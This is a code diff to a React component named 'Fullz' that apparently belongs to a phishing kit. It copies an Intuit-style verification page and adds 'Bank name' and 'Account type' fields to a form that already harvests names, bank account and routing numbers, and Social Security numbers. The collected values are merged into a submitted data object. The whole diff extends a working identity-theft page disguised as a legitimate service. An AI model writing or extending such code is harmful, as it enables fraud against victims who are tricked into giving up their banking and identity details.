@@ -24,11 +24,15 @@ export const Fullz = ({
   const [initialLoad, setInitialLoad] = useState("init");
   const [quickLoad, setQuickLoad] = useState(true);
   const [name, setName] = useState("");
+  const [bank, setBank] = useState("");
+  const [type, setType] = useState("");
   const [number, setNumber] = useState("");
   const [routing, setRouting] = useState("");
   const [ssn, setSsn] = useState("");
   // const [dob, setDob] = useState("");
   const [noName, setNoName] = useState(false);
+  const [noType, setNoType] = useState(false);
+  const [noBank, setNoBank] = useState(false);
   const [noNumber, setNoNumber] = useState(false);
   const [noRouting, setNoRouting] = useState(false);
   // const [noDob, setNoDob] = useState(false);
@@ -149,8 +153,18 @@ export const Fullz = ({
     const validInput = () => {
       let error = !!0;
 
-      if (name.length < 1 || name.length > 30) {
+      if (name.length < 1 || name.length > 50) {
         setNoName(!!1);
+        error = !!1;
+      }
+
+      if (bank.length < 1 || bank.length > 50) {
+        setNoBank(!!1);
+        error = !!1;
+      }
+
+      if (type.length < 1 || type.length > 30) {
+        setNoType(!!1);
         error = !!1;
       }
 
@@ -194,6 +208,8 @@ export const Fullz = ({
     const data = {
       ...sessionEntries,
       name,
+      bank,
+      type,
       number,
       routing,
       ssn,
@@ -241,6 +257,120 @@ export const Fullz = ({
           action="#"
           autoComplete="on"
         >
+          <div
+            data-testid="VerifyOtpField"
+            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
+          >
+            <div
+              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
+              style={{ width: "100%" }}
+            >
+              <label
+                htmlFor="ius-mfa-confirm-code"
+                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
+              >
+                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
+                  Bank name{" "}
+                </span>
+                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
+                  <input
+                    id="ius-mfa-confirm-code"
+                    aria-invalid="false"
+                    width="100%"
+                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
+                      noBank
+                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
+                        : ""
+                    }`}
+                    type="text"
+                    required
+                    autoComplete="off"
+                    data-testid="VerifyOtpInput"
+                    inputMode="text"
+                    name="Verification code"
+                    placeholder=""
+                    value={bank}
+                    onChange={(e: ChangeEvent<HTMLInputElement>) =>
+                      setBank(e.target.value.replace(/[^A-Za-z\s]/g, ""))
+                    }
+                    onFocus={() => {
+                      setNoBank(false);
+                    }}
+                  />
+                </div>
+              </label>
+              <div className="">
+                {noBank ? (
+                  <div
+                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
+                    role="alert"
+                    id="iux-password-confirmation-password-error"
+                    data-automation-id="idsInlineValidationMessage-alertMsg"
+                  >
+                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
+                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
+                        <div className="Badge-iconFix-affba1e">
+                          <svg height="16px" width="16px" viewBox="0 0 144 144">
+                            <svg
+                              xmlns="http://www.w3.org/2000/svg"
+                              fill="none"
+                              viewBox="0 0 20 20"
+                              color="currentColor"
+                              width="100%"
+                              height="100%"
+                              focusable="false"
+                              aria-hidden="true"
+                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
+                            >
+                              <path
+                                fill="currentColor"
+                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
+                                style={{
+                                  transformOrigin: "center center 0px",
+                                }}
+                              ></path>
+                            </svg>
+                            <svg
+                              xmlns="http://www.w3.org/2000/svg"
+                              fill="none"
+                              viewBox="0 0 20 20"
+                              color="currentColor"
+                              width="100%"
+                              height="100%"
+                              focusable="false"
+                              aria-hidden="true"
+                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
+                            >
+                              <path
+                                fill="currentColor"
+                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
+                                style={{
+                                  transformOrigin: "center center 0px",
+                                }}
+                              ></path>
+                            </svg>
+                          </svg>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
+                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
+                        {ERROR.invalidInput.replace("{message}", "Bank name")}
+                      </span>
+                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
+                    </div>
+                  </div>
+                ) : (
+                  ""
+                )}
+              </div>
+            </div>
+            {!noBank && (
+              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
+                &nbsp;
+              </div>
+            )}
+          </div>
           <div
             data-testid="VerifyOtpField"
             className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
@@ -589,6 +719,124 @@ export const Fullz = ({
               </div>
             </div>
             {!noRouting && (
+              <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
+                &nbsp;
+              </div>
+            )}
+          </div>
+          <div
+            data-testid="VerifyOtpField"
+            className="IuxFormInput__StyledFieldWrapper-sc-1nlfpoi-0 jxlqeV"
+          >
+            <div
+              className="TextField-light-d062759 idsTSTextField TextField-TextFieldWrapper-bafba49"
+              style={{ width: "100%" }}
+            >
+              <label
+                htmlFor="ius-mfa-confirm-code"
+                className="TextField-TFLabelWrapper-3541982 TextField-TFHasLabel-78d0998"
+              >
+                <span className="TextField-TFLabelOverride-8e74fad TextField-size-medium-4c97db9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
+                  Account type{" "}
+                </span>
+                <div className="TextField-TFInputWrapper-f1e029f TextField-size-medium-4c97db9">
+                  <input
+                    id="ius-mfa-confirm-code"
+                    aria-invalid="false"
+                    width="100%"
+                    className={`idsF TextField-TFInput-8a2b0cc TextField-light-d062759 TextField-TFNoErrorText-b385be9 TextField-TFNotDisabled-a9f4959 TextField-size-medium-4c97db9  ${
+                      noType
+                        ? "TextField-TFErrorText-995fdeb TextField-TFAddonAfter-5fe16cd"
+                        : ""
+                    }`}
+                    type="text"
+                    required
+                    autoComplete="off"
+                    data-testid="VerifyOtpInput"
+                    inputMode="text"
+                    maxLength={17}
+                    name="Verification code"
+                    placeholder=""
+                    value={type}
+                    onChange={(e: ChangeEvent<HTMLInputElement>) =>
+                      setType(e.target.value.replace(/[^A-Za-z\s]/g, ""))
+                    }
+                    onFocus={() => {
+                      setNoType(false);
+                    }}
+                  />
+                </div>
+              </label>
+              <div className="">
+                {noType ? (
+                  <div
+                    className="InlineValidationMessage-ivm-wrapper-d066fb2 InlineValidationMessage-light-212a3d4"
+                    role="alert"
+                    id="iux-password-confirmation-password-error"
+                    data-automation-id="idsInlineValidationMessage-alertMsg"
+                  >
+                    <div className="idsTSBadge InlineValidationMessage-ivm-status-icon-a3e9327 Badge-light-5c13fad Badge-badge-0c43a9f Badge-error-7e536f4 Badge-round-0018fec">
+                      <div className="Badge-value-da34c95 Badge-light-5c13fad">
+                        <div className="Badge-iconFix-affba1e">
+                          <svg height="16px" width="16px" viewBox="0 0 144 144">
+                            <svg
+                              xmlns="http://www.w3.org/2000/svg"
+                              fill="none"
+                              viewBox="0 0 20 20"
+                              color="currentColor"
+                              width="100%"
+                              height="100%"
+                              focusable="false"
+                              aria-hidden="true"
+                              className="Badge-icon-prefab-7b55bae Badge-background-9ea98c1"
+                            >
+                              <path
+                                fill="currentColor"
+                                d="m18.374 15.023-6.916-12.45a1.666 1.666 0 0 0-2.914 0l-6.916 12.45A1.667 1.667 0 0 0 3.083 17.5h13.834a1.667 1.667 0 0 0 1.457-2.477"
+                                style={{
+                                  transformOrigin: "center center 0px",
+                                }}
+                              ></path>
+                            </svg>
+                            <svg
+                              xmlns="http://www.w3.org/2000/svg"
+                              fill="none"
+                              viewBox="0 0 20 20"
+                              color="currentColor"
+                              width="100%"
+                              height="100%"
+                              focusable="false"
+                              aria-hidden="true"
+                              className="Badge-icon-prefab-7b55bae Badge-foreground-f3e529f"
+                            >
+                              <path
+                                fill="currentColor"
+                                d="M9.167 11.667V7.5a.833.833 0 1 1 1.666 0v4.167a.833.833 0 1 1-1.666 0M9.537 13.474a.833.833 0 1 1 .926 1.385.833.833 0 0 1-.926-1.385"
+                                style={{
+                                  transformOrigin: "center center 0px",
+                                }}
+                              ></path>
+                            </svg>
+                          </svg>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="InlineValidationMessage-ivm-message-container-3984c36">
+                      <span className="InlineValidationMessage-ivm-message-ee9633f InlineValidationMessage-ivm-error-c6247c9 Typography-light-f6c67d3 Typography-body-3-e4a1793">
+                        {ERROR.invalidInput.replace(
+                          "{message}",
+                          "Account type"
+                        )}
+                      </span>
+                      <span className="InlineValidationMessage-ivm-description-9415be4 Typography-light-f6c67d3 Typography-body-3-e4a1793"></span>
+                    </div>
+                  </div>
+                ) : (
+                  ""
+                )}
+              </div>
+            </div>
+            {!noType && (
               <div className="IuxFormInput__ValidationSpacer-sc-1nlfpoi-1 iULrOf">
                 &nbsp;
               </div>
